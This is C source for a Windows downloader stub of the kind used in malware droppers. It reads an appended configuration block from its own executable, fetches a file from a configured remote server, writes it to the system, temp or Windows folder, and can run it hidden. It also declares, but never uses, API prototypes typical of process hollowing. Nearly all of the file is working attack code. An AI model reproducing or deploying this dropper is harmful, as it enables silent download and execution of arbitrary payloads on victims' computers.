#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <winnt.h>
#include <tlhelp32.h>
#include <shellapi.h>
#include <stddef.h>
#include <limits.h>
#include <wininet.h>

#pragma optimize("gsy", on)
#pragma comment(linker, "/ENTRY:Entry")
#pragma comment(linker, "/FILEALIGN:0x200")
#pragma comment(linker, "/MERGE:.rdata=.data")
#pragma comment(linker, "/MERGE:.text=.data")
#pragma comment(linker, "/MERGE:.reloc=.data")
#pragma comment(linker, "/SECTION:.text, EWR /IGNORE:4078")
#pragma comment(linker, "/OPT:NOWIN98")		// Make section alignment really small.
#define WIN32_LEAN_AND_MEAN

#pragma comment(lib, "WININET")

#define STUB_EOF	2560

struct file_data{
	char			szServerPath[512];
	char			szLocalFileName[512];
	char			szCustomDir[512];
	short			iDir;
	short			iDownloadDelay;
	DWORD			dwDTime;
	short			iStartUpDelay;
	DWORD			dwSUTime;
	short			iCheckConnection;
	short			iRun;
	short			iRunStyle;
} *pfile_data;

typedef BOOL (WINAPI *_CreateProcess)(
  LPCTSTR lpApplicationName,
  LPTSTR lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL bInheritHandles,
  DWORD dwCreationFlags,
  LPVOID lpEnvironment,
  LPCTSTR lpCurrentDirectory,
  LPSTARTUPINFO lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);

typedef LONG (WINAPI *_NtUnmapViewOfSection)(
  HANDLE ProcessHandle,
  PVOID BaseAddress
);

typedef LPVOID (WINAPI *_VirtualAllocEx)(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD flAllocationType,
  DWORD flProtect
);

typedef BOOL (WINAPI *_WriteProcessMemory)(
  HANDLE hProcess,
  LPVOID lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T nSize,
  SIZE_T* lpNumberOfBytesWritten
);

typedef BOOL (WINAPI *_GetThreadContext)(
  HANDLE hThread,
  LPCONTEXT lpContext
);

typedef BOOL (WINAPI *_SetThreadContext)(
  HANDLE hThread,
  const CONTEXT* lpContext
);

typedef DWORD (WINAPI *_ResumeThread)(
  HANDLE hThread
);

PIMAGE_DOS_HEADER pidh;
PIMAGE_NT_HEADERS pinh;
PIMAGE_SECTION_HEADER pish;

int Entry(void){
	HANDLE				hStub, hFile;
	DWORD				dwSize, dwBytesRead, dwBytesWritten;
	char				szThisFile[_MAX_FNAME], szPath[1024], szUrl[512];
	char				*szBuf;
	BOOL				bRes;
	HINTERNET			hInet, hData;
	DWORD				dwLen;
	TCHAR				Buffer[2048];
	struct file_data	fd;

	pfile_data= &fd;

	GetModuleFileName(NULL, szThisFile, _MAX_FNAME);

	hStub= CreateFile(szThisFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if( hStub==INVALID_HANDLE_VALUE ){
		return 0;
	}
	dwSize= GetFileSize(hStub, NULL);
	szBuf= (char*)calloc(dwSize, sizeof(char));

	SetFilePointer(hStub, STUB_EOF, NULL, FILE_BEGIN);

	while( ReadFile(hStub, pfile_data, sizeof fd, &dwBytesRead, NULL) && dwBytesRead ){
		if( pfile_data->iDir==0 ){
			sprintf(szPath, "%s", pfile_data->szCustomDir);
		}else if( pfile_data->iDir==1 ){
			GetSystemDirectory(szPath, sizeof szPath);
		}else if( pfile_data->iDir==2 ){
			GetTempPath(sizeof szPath, szPath);
		}else{
			GetWindowsDirectory(szPath, sizeof szPath);
		}
		lstrcat(szPath, "\\");
		lstrcat(szPath, pfile_data->szLocalFileName);
		strcpy(szUrl, pfile_data->szServerPath);

		if( pfile_data->iCheckConnection==1 ){
			bRes= InternetCheckConnection("http://www.xchg.info/", FLAG_ICC_FORCE_CONNECTION, 0);
			while( bRes==FALSE ){
				bRes= InternetCheckConnection("http://www.xchg.info/", FLAG_ICC_FORCE_CONNECTION, 0);
			}
			if( pfile_data->iDownloadDelay==1 ){
				Sleep(pfile_data->dwDTime);
			}
			hInet= InternetOpen("RL/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
			if( !hInet ){
				MessageBox(NULL, "InternetOpen Failed!", "Error 1", MB_OK);
				return FALSE;
			}
			hData= InternetOpenUrl(hInet, szUrl, NULL,0,0,INTERNET_FLAG_RELOAD);
			hFile= CreateFile(szPath, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if( hFile==INVALID_HANDLE_VALUE ){
				return 1;
			}
			if( pfile_data->iStartUpDelay==1 ){
				Sleep(pfile_data->dwSUTime);
			}
			do{
				if( InternetReadFile (hData, &Buffer, 2000,  &dwLen) ){
					if( !dwLen ){
						break;  // Condition of dwSize=0 indicate EOF. Stop.
					}else{
						WriteFile(hFile, Buffer, dwLen, &dwBytesWritten, NULL);
					}
				}
			}while( TRUE );
			CloseHandle(hFile);
			if( pfile_data->iRun==1 ){
				if( pfile_data->iRunStyle==1 ){
					ShellExecute(NULL, "open", szPath, NULL, NULL, SW_SHOWNORMAL);
				}else{
					ShellExecute(NULL, "open", szPath, NULL, NULL, SW_HIDE);
				}
			}
		}
	}
	CloseHandle(hStub);
	return 0;
}
